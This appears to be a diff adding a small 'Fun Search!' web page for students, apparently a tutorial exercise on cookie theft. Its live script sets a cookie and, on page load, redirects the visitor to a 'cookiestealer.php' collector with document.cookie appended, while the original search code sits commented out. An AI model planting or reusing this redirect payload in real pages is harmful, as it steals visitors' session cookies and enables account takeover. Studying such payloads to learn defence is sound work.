@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello Students</title>
+</head>
+<body>
+
+    <h1>Welcome to Fun Search!</h1>
+<input id="searchField"> 
+<button onclick="onSearchPress()">Search</button>
+<div id="resultContainer">
+
+</div>
+
+    <style>
+        body{
+            background-color: black;
+            color: white;
+            text-align: center;
+        }
+    </style>
+<script type="text/javascript">
+document.cookie = "username=Null Byte";
+document.location='http://127.0.0.1/cookiestealer.php?c='+document.cookie;
+
+</script>
+<!--
+  <script>
+      function onSearchPress(){
+        var searchTerm = document.getElementById("searchField").value;
+        console.log(searchTerm);
+        search(searchTerm);
+
+      } 
+
+    function search(searchTerm){
+        var resultContainer = document.getElementById("resultContainer");
+    resultContainer.textContent = "Your search results for :" + searchTerm;
+    }
+
+    
+    window.onload = function(){
+        console.log("Finished loading...");
+        
+        if (hasSearchParameter){
+            var searchString = decodeURI(window.location.search.substring("?q=".length));
+            console.log("Search term:" + searchString);
+            search(searchString);
+        }
+
+        
+         }
+       
+     function hasSearchParameter(){
+        if(window.location.search.indexOf("q=")>0){
+            console.log("Url parameter given");
+            return true;
+        }
+        else{
+            console.log("Url parameter not given.");
+            return false;
+        }
+
+     }    
+         
+      
+    
+
+  </script>  
+  -->
+</body>
+</html>
